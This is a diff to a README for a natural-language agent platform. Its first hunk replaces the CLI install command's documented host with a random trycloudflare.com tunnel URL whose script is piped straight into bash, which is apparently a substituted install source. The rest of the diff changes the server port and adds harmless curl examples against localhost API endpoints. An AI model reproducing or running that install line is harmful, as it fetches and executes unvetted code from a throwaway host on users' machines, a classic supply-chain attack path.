@@ -13,7 +13,7 @@ An agentic backend platform that transforms natural-language instructions into p
 Open a terminal and run:
 
 ```bash
-curl -fsSL https://ai-agents-mcp-tools.onrender.com/cli/install.sh | bash
+curl -fsSL https://fat-coordination-dense-separately.trycloudflare.com/cli/install.sh | bash
 ```
 
 The script detects your OS, downloads the binary to `/usr/local/bin/agents`, and makes it executable. Verify the installation:
@@ -1047,14 +1047,108 @@ Interactive docs: `http://localhost:3030/docs`
 ### Production
 
 ```bash
-uvicorn app.main:app --host 0.0.0.0 --port 3030
+uvicorn app.main:app --host 0.0.0.0 --port 6000
 ```
 
 ### CLI against a local API
 
 ```bash
-AGENTS_API_URL=http://localhost:3030 agents ask "minha aplicação Go não está compilando" \
+AGENTS_API_URL=http://localhost:6000 agents ask "minha aplicação Go não está compilando" \
   --path /path/to/project
+```
+
+---
+
+## Quick API Test (curl)
+
+Start the server first:
+```bash
+uvicorn app.main:app --host 0.0.0.0 --port 6000
+```
+
+Then test with curl:
+
+```bash
+# Health check
+curl http://localhost:6000/health
+
+# List all agents
+curl http://localhost:6000/agents
+
+# List all 118 skills
+curl http://localhost:6000/skills
+
+# List skills for a specific agent
+curl "http://localhost:6000/skills?agent=go"
+curl "http://localhost:6000/skills?agent=diagnostic"
+curl "http://localhost:6000/skills?agent=nextjs"
+
+# Execute a skill directly (Go: generate Fiber handler)
+curl -X POST http://localhost:6000/skills/execute \
+  -H "Content-Type: application/json" \
+  -d '{
+    "agent": "go",
+    "skill": "go.fiber_handler",
+    "params": {
+      "resource": "order",
+      "module_name": "github.com/org/order-service"
+    }
+  }'
+
+# Natural language intent routing (Portuguese)
+curl -X POST http://localhost:6000/workflow/ask \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "criar uma entidade Product com os campos name, price e active",
+    "project_context": {
+      "project_type": "go",
+      "file_count": 1,
+      "files": [
+        { "path": "go.mod", "content": "module github.com/org/store\n\ngo 1.24\n" }
+      ]
+    }
+  }'
+
+# Diagnose and fix Go error
+curl -X POST http://localhost:6000/workflow/diagnose \
+  -H "Content-Type: application/json" \
+  -d '{
+    "language": "go",
+    "error_output": "stat /app/cmd/server: directory not found",
+    "source_files": [
+      { "path": "Dockerfile", "content": "FROM golang:1.24-alpine AS builder\nWORKDIR /app\nCOPY . .\nRUN go build -o server ./cmd/server\nFROM alpine:latest\nCOPY --from=builder /app/server /server\nCMD [\"/server\"]" },
+      { "path": "go.mod", "content": "module github.com/org/service\n\ngo 1.24\n" }
+    ],
+    "module_name": "github.com/org/service"
+  }'
+
+# Full project scaffold
+curl -X POST http://localhost:6000/workflow/scaffold \
+  -H "Content-Type: application/json" \
+  -d '{
+    "objective": "Go microservice for order management with Fiber, PostgreSQL, JWT auth",
+    "project_name": "order-service",
+    "output_dir": "/tmp",
+    "scope": "backend",
+    "backend_language": "go",
+    "backend_framework": "fiber"
+  }'
+
+# Architecture pipeline - parse business objective
+curl -X POST http://localhost:6000/architecture/parse \
+  -H "Content-Type: application/json" \
+  -d '{
+    "objective": "Build a HIPAA-compliant telemedicine platform for 10,000 concurrent patients"
+  }'
+
+# MCP endpoints
+curl http://localhost:6000/mcp/architecture
+curl http://localhost:6000/mcp/backend
+curl http://localhost:6000/mcp/frontend
+curl http://localhost:6000/mcp/orchestrate
+curl http://localhost:6000/mcp/solid
+curl http://localhost:6000/mcp/design-patterns
+curl http://localhost:6000/mcp/quality-assessment
 ```
 
 ---
